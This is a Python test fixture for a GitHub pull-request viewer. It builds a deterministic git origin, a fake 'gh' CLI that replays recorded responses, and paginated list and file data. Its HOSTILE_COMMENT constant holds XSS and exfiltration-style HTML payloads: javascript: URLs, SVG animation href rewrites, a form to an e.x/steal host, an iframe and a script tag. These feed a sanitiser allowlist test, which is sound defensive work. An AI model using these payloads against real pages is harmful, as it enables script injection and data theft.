"""A GitHub stand-in for pull-request tests: an origin, a fake ``gh``, and a cached home.

``build_origin`` writes a deterministic bare ``file://`` origin with ``git fast-import``,
so every commit ID is the same on every machine. It stands in for
``https://github.com/octo/demo`` and carries GitHub's own ``refs/pull/<n>/head``:

| PR | Shape | Head | Base the comparison starts from |
| --- | --- | --- | --- |
| 7 | open, from a fork | ``fork_head``, reachable only through ``refs/pull/7/head`` | the mirror's ``topic`` |
| 8 | merged by another account, same repository, one check skipped | ``merged_head``, merged into ``topic`` | ``base.sha``, ``topic`` before the merge |
| 9 | closed, fork deleted | ``closed_head`` | ``base.sha``, a commit no mirrored ref reaches |
| 10 | open draft, same repository | ``draft_head`` on ``wip`` | the mirror's ``topic`` |

``scenario`` answers every ``gh api`` read of those pull requests from
``tests/fixtures/github-pull/responses.json``, scrubbed real responses, and ``gh auth
status`` for one signed-in account. GraphQL catalog pages contain 102 rows, of which
100 are open and two are closed. Fixed REST list entries remain available for generic
transport tests:

| List | Pages |
| --- | --- |
| ``all`` | one full page, 106 down to 7, with a next link; a second page, 6 and 5 |
| ``open`` | 10 and 7 |
| ``closed`` | 9 and 8 |

Pull requests other than those four appear in a list and have no record.
``install_fake_gh`` writes a ``gh`` that replays a scenario and logs each call; it is a
Python script run by this interpreter.

Run as a script, it builds ``<directory>/home``, an application home holding the
mirror and the records of all four pull requests, fetched through the production CLI
path with the fake ``gh`` and a fixed clock, a complete metadata catalog last read
by another account, and ``<directory>/root``::

    github_pull_fixture.py <directory>

With ``--serve``, it serves one of those pull requests from that home for a browser, as
the QA runbook's pull-request page walkthrough does::

    github_pull_fixture.py <directory> --serve <number> <port>
"""

from __future__ import annotations

import asyncio
import contextlib
import copy
import functools
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
from collections.abc import Generator, Mapping
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import TYPE_CHECKING, Any, Final

if TYPE_CHECKING:
    from metabrowser.builtin_plugins.github.pull_catalog import CatalogState
    from metabrowser.builtin_plugins.github.pull_list import ListedRepository

CANONICAL: Final = "https://github.com/octo/demo"
READER: Final = "octo-reader"
ANOTHER_READER: Final = "someone-else"
FETCHED_AT: Final = datetime(2026, 9, 17, 12, 0, tzinfo=UTC)
RESPONSES: Final = Path(__file__).parent / "fixtures" / "github-pull" / "responses.json"
DEFAULT_BRANCH: Final = "topic"
_WHEN: Final = 1788000000

_FAKE_GH: Final = """#!{python}
import json, os, sys

args = sys.argv[1:]
log = os.environ.get("FAKE_GH_LOG")
state_path = os.environ["FAKE_GH_STATE"]
with open(os.environ["FAKE_GH_SCENARIO"], encoding="utf-8") as handle:
    scenario = json.load(handle)
try:
    with open(state_path, encoding="utf-8") as handle:
        counts = json.load(handle)
except FileNotFoundError:
    counts = {{}}


def pick(key, value):
    if not isinstance(value, list):
        return value
    index = counts.get(key, 0)
    counts[key] = index + 1
    with open(state_path, "w", encoding="utf-8") as handle:
        json.dump(counts, handle)
    return value[min(index, len(value) - 1)]


if log:
    watched = ("GH_PROMPT_DISABLED", "GH_NO_UPDATE_NOTIFIER", "NO_COLOR", "GH_DEBUG",
               "GH_HOST", "GH_REPO", "GH_FORCE_TTY", "CLICOLOR_FORCE")
    stdin_null = os.path.samestat(os.fstat(0), os.stat(os.devnull))
    with open(log, "a", encoding="utf-8") as handle:
        handle.write(json.dumps({{"args": args, "stdin_null": stdin_null,
                                 "env": {{name: os.environ.get(name) for name in watched}}}}) + "\\n")

if args == ["stack", "--version"]:
    version = scenario.get("stack_version")
    if version:
        sys.stdout.write("gh stack version " + version + "\\n")
    sys.exit(0 if version else 1)

if args[:2] == ["auth", "status"]:
    answer = pick("auth", scenario["auth"])
    sys.stdout.write(answer.get("stdout", ""))
    sys.stderr.write(answer.get("stderr", ""))
    sys.exit(answer.get("exit", 0))

if args[:1] == ["api"]:
    failure = scenario.get("api_failure")
    if failure:
        sys.stderr.write(failure["stderr"])
        sys.exit(failure.get("exit", 1))
    path, match, index, fields = None, None, 1, {{}}
    while index < len(args):
        arg = args[index]
        if arg in ("-f", "-F"):
            key, _, value = args[index + 1].partition("=")
            fields[key] = value
            index += 2
            continue
        if arg in ("--hostname", "--method", "-H", "--jq"):
            if arg == "-H" and args[index + 1].startswith("If-None-Match: "):
                match = args[index + 1].split(": ", 1)[1]
            index += 2
            continue
        if not arg.startswith("-"):
            path = arg
        index += 1
    if path == "graphql":
        if fields.get("query", "").startswith("query PullCore("):
            path = "graphql:core:" + fields.get("number", "missing")
        elif fields.get("query", "").lstrip().startswith("query MetabrowserPullTimeline("):
            path = "graphql:timeline:" + fields.get("number", "missing") + ":" + fields.get("cursor", "start")
        elif fields.get("query", "").startswith("query VisiblePullCores("):
            slots = [f"n{{i}}" for i in range(8)]
            path = "graphql:visible-cores:" + ",".join(fields[key] for key in slots if key in fields)
        else:
            tail = fields.get("query", "").split("page:pullRequests", 1)[-1]
            state = "updated" if "field:UPDATED_AT" in tail else "closed" if "states:[CLOSED,MERGED]" in tail else "open" if "states:OPEN" in tail else "all"
            path = "graphql:" + state + ":" + fields.get("cursor", "start")
        if fields.get("owner", "").casefold() != "octo" or fields.get("name", "").casefold() != "demo":
            path = "graphql:unavailable-repository"
    entry = pick(path, scenario["api"].get(path, {{"status": 404, "body": {{"message": "Not Found"}}}}))
    status = entry["status"]
    headers = dict(entry.get("headers", {{}}))
    body = entry["raw"].encode() if "raw" in entry else json.dumps(entry.get("body", None)).encode()
    if match is not None and headers.get("Etag") == match:
        status, body = 304, b""
    reason = {{200: "OK", 304: "Not Modified", 403: "Forbidden", 404: "Not Found",
              429: "Too Many Requests"}}.get(status, "Status")
    out = f"HTTP/2.0 {{status}} {{reason}}\\n".encode()
    for name, value in headers.items():
        out += f"{{name}}: {{value}}\\r\\n".encode()
    out += b"\\r\\n" + (body if status != 304 else b"")
    sys.stdout.buffer.write(out)
    if 200 <= status < 300:
        sys.exit(0)
    sys.stderr.write(f"gh: HTTP {{status}}\\n")
    sys.exit(1)

sys.stderr.write("fake gh: unexpected arguments\\n")
sys.exit(2)
"""


@dataclass(frozen=True, slots=True)
class Origin:
    """The origin repository and the commits the tests name."""

    path: Path
    commits: Mapping[str, str]

    @property
    def url(self) -> str:
        return f"file://{self.path.resolve()}"

    def __getitem__(self, name: str) -> str:
        return self.commits[name]


def git_env(root: Path) -> dict[str, str]:
    env = {name: value for name, value in os.environ.items() if not name.startswith("GIT_")}
    env["GIT_CONFIG_GLOBAL"] = str(root / ".gitconfig-absent")
    env["GIT_CONFIG_SYSTEM"] = str(root / ".gitconfig-absent")
    return env


def _commit(
    ref: str,
    mark: int,
    message: str,
    files: Mapping[str, str],
    *,
    parent: int | None,
    merge: int | None = None,
) -> bytes:
    stream = f"commit {ref}\nmark :{mark}\n"
    stream += f"committer Origin <origin@example.invalid> {_WHEN + mark * 3600} +0000\n"
    stream += f"data {len(message)}\n{message}\n"
    if parent is not None:
        stream += f"from :{parent}\n"
    if merge is not None:
        stream += f"merge :{merge}\n"
    for name, body in files.items():
        data = body.encode()
        stream += f"M 100644 inline {name}\ndata {len(data)}\n{body}\n"
    return (stream + "\n").encode()


def build_origin(directory: Path) -> Origin:
    """The origin; every pull-request ref is written the way GitHub writes it."""

    origin = directory / "github-pull-origin.git"
    env = git_env(directory)
    subprocess.run(
        ["git", "init", "-q", "--bare", "--template=", "-b", DEFAULT_BRANCH, str(origin)],
        check=True,
        capture_output=True,
        env=env,
    )
    topic = f"refs/heads/{DEFAULT_BRANCH}"
    stream = b"".join(
        [
            _commit(
                topic,
                1,
                "base",
                {"README.md": "# Demo\n", "src/app.txt": "one\n", "docs/guide.md": "# Guide\n"},
                parent=None,
            ),
            _commit(topic, 2, "topic moves", {"README.md": "# Demo\n\nOn topic.\n"}, parent=1),
            _commit("refs/pull/7/head", 3, "extra", {"src/app.txt": "one\nextra\n"}, parent=1),
            _commit(
                "refs/pull/7/head",
                4,
                "count to two",
                {"src/app.txt": "one\ntwo\n", "docs/new.md": "# New\n"},
                parent=3,
            ),
            _commit(
                "refs/pull/8/head",
                5,
                "more guide",
                {"docs/guide.md": "# Guide\n\nMore.\n"},
                parent=1,
            ),
            _commit(topic, 6, "Merge pull request #8", {}, parent=2, merge=5),
            _commit("refs/keep/rewritten", 7, "rewritten base", {"src/other.txt": "x\n"}, parent=1),
            _commit("refs/pull/9/head", 8, "spam", {"src/app.txt": "one\nspam\n"}, parent=1),
            _commit("refs/heads/wip", 9, "draft", {"docs/draft.md": "# Draft\n"}, parent=6),
            b"reset refs/pull/10/head\nfrom :9\n\n",
            b"done\n",
        ]
    )
    subprocess.run(
        ["git", "--git-dir", str(origin), "fast-import", "--quiet", "--done"],
        check=True,
        capture_output=True,
        input=stream,
        env=env,
    )

    def rev(ref: str) -> str:
        return subprocess.run(
            ["git", "--git-dir", str(origin), "rev-parse", ref],
            check=True,
            capture_output=True,
            text=True,
            env=env,
        ).stdout.strip()

    commits = {
        "base": rev(f"{topic}~1^1"),
        "topic_before_merge": rev(f"{topic}^1"),
        "topic": rev(topic),
        "fork_earlier": rev("refs/pull/7/head^"),
        "fork_head": rev("refs/pull/7/head"),
        "merged_head": rev("refs/pull/8/head"),
        "rewritten_base": rev("refs/keep/rewritten"),
        "closed_head": rev("refs/pull/9/head"),
        "draft_head": rev("refs/pull/10/head"),
    }
    return Origin(origin, commits)


def copy_origin(built: Origin, directory: Path) -> Origin:
    """A private copy of *built* in *directory*, for a test that fetches from or moves it.

    The commits are a function of the recipe, so the copy names the same ones. One build
    serves a whole test session and ``pull_origin`` in ``tests/conftest.py`` hands each
    test a copy: measured on 2026-10-01, at a load average near 50, ``build_origin``
    took a median 0.55 s for its eleven Git commands and the copy 0.04 s.
    """

    path = directory / built.path.name
    shutil.copytree(built.path, path)
    return Origin(path, built.commits)


def clone_checkout(
    origin: Origin, path: Path, *, remote: str = CANONICAL + ".git", branch: str = "wip"
) -> Path:
    """A checkout of the stand-in origin, as a reader's clone of the repository is.

    Its ``origin`` names *remote*, the GitHub address, while its objects came from the
    local origin. On ``wip`` its ``HEAD`` is pull request 10's head, and it holds 8's,
    which ``topic`` merged; it lacks 7's and 9's, which only their pull-request refs reach.
    """

    env = git_env(path.parent)
    subprocess.run(
        ["git", "clone", "-q", "--template=", origin.url, str(path)],
        check=True,
        capture_output=True,
        env=env,
    )
    for args in (("remote", "set-url", "origin", remote), ("checkout", "-q", branch)):
        subprocess.run(["git", "-C", str(path), *args], check=True, capture_output=True, env=env)
    return path


def _etag(path: str, body: object) -> str:
    digest = hashlib.sha256(path.encode() + json.dumps(body, sort_keys=True).encode()).hexdigest()
    return f'W/"{digest}"'


def ok(path: str, body: object, headers: Mapping[str, str] | None = None) -> dict[str, Any]:
    """A ``200`` with a deterministic ETag and GitHub's rate-limit headers."""

    return {
        "status": 200,
        "headers": {
            "Etag": _etag(path, body),
            "X-Ratelimit-Limit": "5000",
            "X-Ratelimit-Remaining": "4999",
            "X-Ratelimit-Reset": "1790181960",
            **(headers or {}),
        },
        "body": body,
    }


def _substitute(value: Any, names: Mapping[str, str]) -> Any:
    if isinstance(value, str):
        for placeholder, commit in names.items():
            value = value.replace(placeholder, commit)
        return value
    if isinstance(value, list):
        return [_substitute(item, names) for item in value]  # pyright: ignore[reportUnknownVariableType]
    if isinstance(value, dict):
        return {key: _substitute(item, names) for key, item in value.items()}  # pyright: ignore[reportUnknownVariableType]
    return value


def recorded_responses() -> dict[str, Any]:
    with RESPONSES.open(encoding="utf-8") as handle:
        return json.load(handle)


def pull_bodies(origin: Origin) -> dict[int, dict[str, Any]]:
    """The API's view of each pull request, keyed by number."""

    template = recorded_responses()
    fork = _substitute(
        template,
        {
            "@HEAD@": origin["fork_head"],
            "@BASE@": origin["topic_before_merge"],
            "@EARLIER@": origin["fork_earlier"],
        },
    )
    pulls: dict[int, dict[str, Any]] = {7: fork}
    merged = copy.deepcopy(fork)
    merged["pull"].update(
        number=8,
        state="closed",
        merged=True,
        # Merged by someone other than its author, as github.com's header then says.
        merged_by={"login": "octo"},
        commits=1,
        mergeable=None,
        merge_commit_sha=origin["topic"],
        title="Say more in the guide",
        body="",
        labels=[],
        user={"login": "maintainer"},
        merged_at="2026-09-16T18:00:00Z",
        closed_at="2026-09-16T18:00:00Z",
        html_url=f"{CANONICAL}/pull/8",
        base={
            "ref": "topic",
            "sha": origin["topic_before_merge"],
            "repo": {"full_name": "octo/demo"},
        },
        head={
            "ref": "guide-more",
            "sha": origin["merged_head"],
            "repo": {"full_name": "octo/demo"},
        },
    )
    # Its docs job was skipped, as cli/cli#14128's 13 skipped runs were: GitHub counts
    # skipped checks apart from neutral ones.
    merged_checks = copy.deepcopy(fork["check_runs"])
    merged_checks["check_runs"][1].update(status="completed", conclusion="skipped")
    pulls[8] = {
        **merged,
        "issue_comments": [],
        "reviews": [],
        "review_comments": [],
        "check_runs": merged_checks,
    }
    closed = copy.deepcopy(fork)
    closed["pull"].update(
        number=9,
        state="closed",
        commits=1,
        mergeable=None,
        title="spam",
        body=None,
        labels=[{"name": "invalid"}],
        user=None,
        closed_at="2026-09-16T19:00:00Z",
        html_url=f"{CANONICAL}/pull/9",
        base={"ref": "topic", "sha": origin["rewritten_base"], "repo": {"full_name": "octo/demo"}},
        head={"ref": "spam", "sha": origin["closed_head"], "repo": None},
    )
    pulls[9] = {**closed, "issue_comments": [], "reviews": [], "review_comments": []}
    draft = copy.deepcopy(fork)
    draft["pull"].update(
        number=10,
        draft=True,
        commits=1,
        mergeable=False,
        title="WIP: draft the next page",
        body="Not ready.",
        labels=[],
        user={"login": "maintainer"},
        html_url=f"{CANONICAL}/pull/10",
        base={"ref": "topic", "sha": origin["topic"], "repo": {"full_name": "octo/demo"}},
        head={"ref": "wip", "sha": origin["draft_head"], "repo": {"full_name": "octo/demo"}},
    )
    empty_checks = {"total_count": 0, "check_runs": []}
    pending = {"state": "pending", "total_count": 0, "statuses": []}
    pulls[10] = {
        **draft,
        "issue_comments": [],
        "reviews": [],
        "review_comments": [],
        "check_runs": empty_checks,
        "status": pending,
    }
    return pulls


# A comment written to attack the pull-request page: markup that loads on render (a
# stylesheet, images, media, frames, SVG paint servers and filters with `url()`),
# rewrites a link (SVG SMIL), reaches the application's own styling and document-wide
# handlers (`class`, `data-*`), names an element for scripts (`id`, `name`), reports a
# click (`ping`, `attributionsrc`), styles itself, or submits. Its first line is ordinary
# Markdown that must survive.
HOSTILE_COMMENT: Final = (
    "Rebased on `topic`; see [the docs](docs/new.md).\n\n"
    '<link rel="stylesheet" href="http://127.0.0.1:9/evil.css"><style>p{color:red}</style>\n'
    '<img src="https://example.com/badge.png" alt="build badge"> <img src="javascript:alert(1)">\n'
    '<a id="metabrowser" name="settings" href="https://example.com/x" ping="https://e.x/p"'
    ' attributionsrc="https://e.x/a">x</a>\n'
    '<svg width="10" height="10"><rect width="10" height="10" fill="url(http://e.x/f#p)"'
    ' stroke="url(http://e.x/s#p)" marker-start="url(http://e.x/m#p)"'
    ' filter="url(http://e.x/fi#p)" mask="url(http://e.x/ma#p)"'
    ' clip-path="url(http://e.x/c#p)"/><use href="#kpress-icon-copy"></use>'
    '<a href="#x"><set attributeName="href" to="javascript:alert(1)"/>'
    '<animate attributeName="href" values="javascript:alert(1)"/>s</a></svg>\n'
    '<div data-kpress-video-id="dQw4w9WgXcQ">video</div>'
    '<span data-mb-copy="evil" data-nav-dir="up">copy</span>'
    '<div class="modal-overlay">fake dialog</div>'
    '<p style="cursor:url(http://e.x/c.png),auto">styled</p>\n'
    '<form action="https://e.x/steal"><input name="q" src="https://e.x/i.png"></form>'
    '<iframe src="https://e.x/f"></iframe><video src="https://e.x/v.mp4"></video>'
    "<script>alert(1)</script>\n"
)


def allowlist_violations(html: str, *, images: bool = False) -> list[str]:
    """Every tag and attribute in *html* the page may not insert, parsed as HTML.

    The allowlist is :mod:`metabrowser.inert_html`'s. *images* admits an image, which a
    document inside the served tree keeps and a pull-request comment never does. Every
    link must leave for http(s) or stay inside the served tree, a heading's ``id`` must
    be one of the hardener's anchors, and an image's ``loading`` must be ``lazy``.
    """

    from html.parser import HTMLParser

    from metabrowser.inert_html import ALLOWED_ATTRIBUTES, ALLOWED_TAGS, ANCHOR_PREFIX, is_inside

    tags = ALLOWED_TAGS | ({"img"} if images else set())
    found: list[str] = []

    class _Check(HTMLParser):
        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            if tag not in tags:
                found.append(f"<{tag}>")
            for name, value in attrs:
                if name not in ALLOWED_ATTRIBUTES.get(tag, ()):
                    found.append(f"{tag}[{name}]")
                elif name == "id" and not (value or "").startswith(ANCHOR_PREFIX):
                    found.append(f"{tag}[id={value}]")
                elif name == "loading" and value != "lazy":
                    found.append(f"{tag}[loading={value}]")
                elif name in {"href", "src"} and not (
                    (value or "").startswith(("https://", "http://")) or is_inside(value)
                ):
                    found.append(f"{tag}[{name}={value}]")
            if tag == "img" and not any(name == "loading" for name, _value in attrs):
                found.append("img[loading missing]")

    checker = _Check()
    checker.feed(html)
    checker.close()
    return found


def html_tree(html: str) -> list[Any]:
    """*html* parsed as HTML into nested ``{"tag", "attrs", "children"}`` nodes and text.

    Browserless sessions build a template from it, so the page's own defense runs on a
    real parse of what KPress sends rather than on a parse the session does itself.
    """

    from html.parser import HTMLParser

    void = {
        "area",
        "base",
        "br",
        "col",
        "embed",
        "hr",
        "img",
        "input",
        "link",
        "meta",
        "param",
        "source",
        "track",
        "wbr",
    }
    root: dict[str, Any] = {"children": []}
    stack = [root]

    class _Build(HTMLParser):
        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            node = {"tag": tag, "attrs": [[k, v or ""] for k, v in attrs], "children": []}
            stack[-1]["children"].append(node)
            if tag not in void:
                stack.append(node)

        def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            node = {"tag": tag, "attrs": [[k, v or ""] for k, v in attrs], "children": []}
            stack[-1]["children"].append(node)

        def handle_endtag(self, tag: str) -> None:
            for depth in range(len(stack) - 1, 0, -1):
                if stack[depth].get("tag") == tag:
                    del stack[depth:]
                    break

        def handle_data(self, data: str) -> None:
            stack[-1]["children"].append(data)

    builder = _Build(convert_charrefs=True)
    builder.feed(html)
    builder.close()
    return root["children"]


def page(path: str) -> str:
    return f"{path}?per_page=100&page=1"


def logged_gh_calls(directory: Path) -> list[str]:
    """What the fake ``gh`` was asked since the last call, as a transcript lists it."""

    log = directory / "fake-gh-log.jsonl"
    if not log.exists():
        return []
    calls: list[str] = []
    for line in log.read_text(encoding="utf-8").splitlines():
        args: list[str] = json.loads(line)["args"]
        if args == ["stack", "--version"]:
            calls.append("gh stack --version")
            continue
        if args[:2] == ["auth", "status"]:
            calls.append("gh auth status")
            continue
        if "graphql" in args:
            fields = dict(arg.split("=", 1) for arg in args if "=" in arg)
            if fields.get("query", "").startswith("query PullCore("):
                calls.append(f"gh api graphql core number={fields.get('number', 'missing')}")
                continue
            if fields.get("query", "").lstrip().startswith("query MetabrowserPullTimeline("):
                calls.append(
                    f"gh api graphql timeline number={fields.get('number', 'missing')} "
                    f"cursor={fields.get('cursor', 'start')}"
                )
                continue
            if fields.get("query", "").startswith("query VisiblePullCores("):
                slots = [f"n{i}" for i in range(8)]
                numbers = ",".join(fields[key] for key in slots if key in fields)
                calls.append(f"gh api graphql visible-cores numbers={numbers}")
                continue
            tail = fields.get("query", "").split("page:pullRequests", 1)[-1]
            state = (
                "updated"
                if "field:UPDATED_AT" in tail
                else "closed"
                if "states:[CLOSED,MERGED]" in tail
                else "open"
                if "states:OPEN" in tail
                else "all"
            )
            calls.append(
                f"gh api graphql catalog state={state} cursor={fields.get('cursor', 'start')}"
            )
            continue
        path = next(arg for arg in args if arg.startswith("repos/"))
        if "--jq" in args:
            calls.append(f"gh api {path} --jq {args[args.index('--jq') + 1]}")
            continue
        conditional = any(arg.startswith("If-None-Match: ") for arg in args)
        calls.append(f"gh api {path}" + (" (If-None-Match)" if conditional else ""))
    log.unlink()
    return calls


def in_a_stable_order(calls: list[str]) -> list[str]:
    """The log's calls, with those that run together in one order.

    A refresh reads the pull first, for its head, and then its other parts in flight
    together, which reach the log in whatever order the processes did. Only those parts
    are sorted: a list's pages are read one after another, and their order is pinned.
    """

    ordered: list[str] = []
    together: list[str] = []
    for call in calls:
        if _RECORD_PART.match(call):
            together.append(call)
            continue
        ordered.extend(sorted(together))
        together = []
        ordered.append(call)
    ordered.extend(sorted(together))
    return ordered


# The parts of a record a refresh reads together, after the pull itself.
_RECORD_PART = re.compile(
    r"gh api repos/[^/]+/[^/]+/"
    r"(issues/\d+/comments|pulls/\d+/comments|pulls/\d+/reviews|commits/[0-9a-f]+/(status|check-runs))\?"
)


def graph_core_data(item: Mapping[str, Any], *, reader: str = READER) -> dict[str, Any]:
    """One fixed GraphQL core response, including test-vs-actual merge commit semantics."""

    def side(prefix: str) -> dict[str, Any] | None:
        repository = item[prefix].get("repo")
        return None if repository is None else {"nameWithOwner": repository["full_name"]}

    merge_oid = item.get("merge_commit_sha")
    return {
        "viewer": {"login": reader},
        "repository": {
            "id": "R_demo",
            "nameWithOwner": "octo/demo",
            "pull": {
                "number": item["number"],
                "url": item["html_url"],
                "title": item["title"],
                "body": item.get("body"),
                "state": "MERGED" if item.get("merged") else item["state"].upper(),
                "isDraft": item.get("draft", False),
                "merged": item.get("merged", False),
                "author": item.get("user"),
                "mergedBy": item.get("merged_by"),
                "commits": {"totalCount": item.get("commits")},
                "mergeCommit": {"oid": merge_oid} if item.get("merged") and merge_oid else None,
                "potentialMergeCommit": {"oid": merge_oid}
                if not item.get("merged") and merge_oid
                else None,
                "mergeable": "MERGEABLE"
                if item.get("mergeable") is True
                else "CONFLICTING"
                if item.get("mergeable") is False
                else "UNKNOWN",
                "labels": {"nodes": item.get("labels", [])},
                "baseRefName": item["base"]["ref"],
                "baseRefOid": item["base"]["sha"],
                "baseRepository": side("base"),
                "headRefName": item["head"]["ref"],
                "headRefOid": item["head"]["sha"],
                "headRepository": side("head"),
                **{
                    field + "At": item.get(field + "_at")
                    for field in ("created", "updated", "closed", "merged")
                },
            },
        },
    }


def graph_core_entry(item: Mapping[str, Any], *, reader: str = READER) -> dict[str, Any]:
    """The explicit fake-gh entry for its separately named fixed core query."""
    return ok(f"graphql:core:{item['number']}", {"data": graph_core_data(item, reader=reader)})


def api_entries(origin: Origin) -> dict[str, Any]:
    """Every ``gh api`` path of pull requests 7 to 10 and its recorded answer."""

    base = "repos/octo/demo"
    entries: dict[str, Any] = {}
    for number, parts in pull_bodies(origin).items():
        head = parts["pull"]["head"]["sha"]
        paths = {
            f"{base}/pulls/{number}": parts["pull"],
            page(f"{base}/issues/{number}/comments"): parts["issue_comments"],
            page(f"{base}/pulls/{number}/reviews"): parts["reviews"],
            page(f"{base}/pulls/{number}/comments"): parts["review_comments"],
            page(f"{base}/commits/{head}/check-runs"): parts["check_runs"],
            page(f"{base}/commits/{head}/status"): parts["status"],
        }
        for path, body in paths.items():
            entries[path] = ok(path, body)
        entries[f"graphql:core:{number}"] = graph_core_entry(parts["pull"])
    return entries


def list_page(state: str, number: int = 1) -> str:
    """The ``gh api`` path of one full-size page of a repository's list."""

    query = f"state={state}&sort=created&direction=desc&per_page=100&page={number}"
    return f"repos/octo/demo/pulls?{query}"


def next_link(path: str, number: int) -> dict[str, str]:
    """The ``Link`` header of a page GitHub has another page after."""

    return {"Link": f'<https://api.github.com/{path}?page={number + 1}>; rel="next"'}


@functools.cache
def _recorded_list_item() -> dict[str, Any]:
    return recorded_responses()["list_item"]


def list_item(pull: Mapping[str, Any]) -> dict[str, Any]:
    """*pull* as a list's item carries it: every key of the real item, with its values."""

    item = _recorded_list_item()
    number = pull["number"]
    links = {
        key: value.replace("/7", f"/{number}")
        for key, value in item.items()
        if key == "url" or (key.endswith("_url") and key != "review_comment_url")
    }
    labels = [{**item["labels"][0], "name": label["name"]} for label in pull["labels"]]
    copied = (
        "number",
        "state",
        "title",
        "user",
        "body",
        "created_at",
        "updated_at",
        "closed_at",
        "merged_at",
        "merge_commit_sha",
        "head",
        "base",
        "draft",
    )
    return {**item, **links, **{key: pull[key] for key in copied}, "labels": labels}


def generated_item(number: int) -> dict[str, Any]:
    """A pull request that only lists hold, newer the higher its *number*."""

    when = (FETCHED_AT.replace(hour=8) + timedelta(minutes=number)).strftime("%Y-%m-%dT%H:%M:%SZ")
    side = {"repo": {"full_name": "octo/demo"}}
    return list_item(
        {
            "number": number,
            "state": "open",
            "title": f"Work item {number}",
            "user": {"login": "contributor"},
            "body": f"The description of work item {number}.",
            "created_at": when,
            "updated_at": when,
            "closed_at": None,
            "merged_at": None,
            "merge_commit_sha": None,
            "head": {"ref": f"work-{number}", "sha": "0" * 40, **side},
            "base": {"ref": DEFAULT_BRANCH, "sha": "0" * 40, **side},
            "draft": False,
            "labels": [],
        }
    )


def list_entries(origin: Origin) -> dict[str, Any]:
    """Every ``gh api`` path of the repository's lists and its answer."""

    known = {number: list_item(parts["pull"]) for number, parts in pull_bodies(origin).items()}
    first_page = [
        *(generated_item(number) for number in range(106, 10, -1)),
        *(known[number] for number in (10, 9, 8, 7)),
    ]
    pages: list[tuple[str, list[dict[str, Any]], Mapping[str, str] | None]] = [
        (list_page("all"), first_page, next_link("repos/octo/demo/pulls", 1)),
        (list_page("all", 2), [generated_item(6), generated_item(5)], None),
        (list_page("open"), [known[10], known[7]], None),
        (list_page("closed"), [known[9], known[8]], None),
    ]
    return {path: ok(path, body, headers) for path, body, headers in pages}


# ── Changed files ───────────────────────────────────────────────

# Pull request 106's files: a chain of single-child folders, ``src/app``, that
# splits below; a rename inside a folder and one across folders; a deleted file; a binary
# file, which GitHub counts as no lines; a name with a control character and one with a
# zero-width space, which the display rule replaces; and enough of one folder's files to
# fill three pages, the last of them short.
_TREE_FILES: Final[tuple[tuple[str, str, str | None, int, int], ...]] = (
    ("README.md", "modified", None, 2, 1),
    ("assets/logo.png", "modified", None, 0, 0),
    ("docs/guide.md", "renamed", "docs/old-guide.md", 3, 0),
    ("docs/removed.md", "removed", None, 0, 12),
    *(
        (f"src/app/plugins/github/mod_{index:03d}.py", "modified", None, 4, 2)
        for index in range(239)
    ),
    ("src/app/plugins/github/pull_files.py", "added", None, 120, 0),
    ("src/app/views/one.py", "modified", None, 1, 1),
    ("src/app/views/two.py", "added", None, 9, 0),
    ("tools/new/script.sh", "renamed", "scripts/script.sh", 0, 0),
    ("weird/bell\u0007name.txt", "added", None, 1, 0),
    ("weird/zero\u200bwidth.md", "modified", None, 1, 1),
)
# The pull request GitHub stops listing at its limit: 3,000 files on 30 full pages.
CAPPED_PULL: Final = 105
TREE_PULL: Final = 106


def files_page(number: int, page_number: int = 1) -> str:
    """The ``gh api`` path of one full-size page of a pull request's changed files."""

    return f"repos/octo/demo/pulls/{number}/files?per_page=100&page={page_number}"


def files_link(number: int, page_number: int, last: int) -> dict[str, str]:
    """The ``Link`` header of a page of changed files that has another after it."""

    base = f"https://api.github.com/repositories/1/pulls/{number}/files?per_page=100"
    return {
        "Link": f'<{base}&page={page_number + 1}>; rel="next", <{base}&page={last}>; rel="last"'
    }


@functools.cache
def _recorded_file_item() -> dict[str, Any]:
    return recorded_responses()["file_item"]


def file_item(
    path: str,
    status: str = "modified",
    previous: str | None = None,
    additions: int = 1,
    deletions: int = 0,
) -> dict[str, Any]:
    """*path* as GitHub's list of changed files carries it: every key of the real item."""

    item = {
        key: value for key, value in _recorded_file_item().items() if key != "previous_filename"
    }
    links = {
        key: item[key].replace("docs/guide.md", path)
        for key in ("blob_url", "raw_url", "contents_url")
    }
    fields = {"filename": path, "status": status, "additions": additions, "deletions": deletions}
    renamed = {"previous_filename": previous} if previous is not None else {}
    return {**item, **links, **fields, "changes": additions + deletions, **renamed}


def tree_files() -> list[dict[str, Any]]:
    """Pull request 106's changed files, in GitHub's order, which is by path."""

    rows = sorted(_TREE_FILES, key=lambda row: row[0])
    return [
        file_item(path, status, previous, adds, dels) for path, status, previous, adds, dels in rows
    ]


def file_pages(number: int, items: list[dict[str, Any]]) -> dict[str, Any]:
    """*items* as GitHub's full-size pages, each with its ``Link``, keyed by ``gh api`` path.

    The last page names no next page, which at 3,000 files is GitHub's own end: the
    thirtieth page is full and names none, as nodejs/node#65161's did.
    """

    chunks = [items[start : start + 100] for start in range(0, len(items), 100)] or [[]]
    last = len(chunks)
    entries: dict[str, Any] = {}
    for index, chunk in enumerate(chunks, start=1):
        path = files_page(number, index)
        entries[path] = ok(path, chunk, files_link(number, index, last) if index < last else None)
    return entries


def file_entries() -> dict[str, Any]:
    """Every ``gh api`` path of changed files the stand-in answers."""

    capped = [file_item(f"gen/part{index // 100:02d}/file{index:04d}.txt") for index in range(3000)]
    return {
        **file_pages(
            7,
            [
                file_item("docs/new.md", "added", None, 1, 0),
                file_item("src/app.txt", "modified", None, 1, 0),
            ],
        ),
        **file_pages(TREE_PULL, tree_files()),
        **file_pages(CAPPED_PULL, capped),
    }


def files_scenario(origin: Origin) -> dict[str, Any]:
    """:func:`scenario`, answering the changed files too, which only their tests read."""

    answers = scenario(origin)
    return {**answers, "api": {**answers["api"], **file_entries()}}


def account(login: str = READER, *, state: str = "success") -> dict[str, Any]:
    """A ``gh auth status --json hosts`` answer for one active github.com account."""

    host = {
        "state": state,
        "active": True,
        "host": "github.com",
        "login": login,
        "tokenSource": "keyring",
        "scopes": "repo",
        "gitProtocol": "https",
    }
    return {"stdout": json.dumps({"hosts": {"github.com": [host]}}) + "\n", "exit": 0}


def catalog_entries(
    items: list[dict[str, Any]], *, reader: str = READER, repository_id: str = "R_demo"
) -> dict[str, Any]:
